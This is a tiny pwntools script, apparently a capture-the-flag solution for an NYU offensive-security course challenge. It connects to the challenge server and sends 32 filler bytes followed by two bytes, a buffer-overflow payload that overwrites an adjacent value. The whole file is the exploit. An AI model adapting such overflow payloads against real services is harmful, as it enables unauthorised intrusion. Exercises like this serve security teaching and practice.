from pwn import *
context.log_level = "DEBUG"


r = remote("offsec-chalbroker.osiris.cyber.nyu.edu", 9090)
r.recvline()
r.sendline("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x37\x13")
r.recvline()
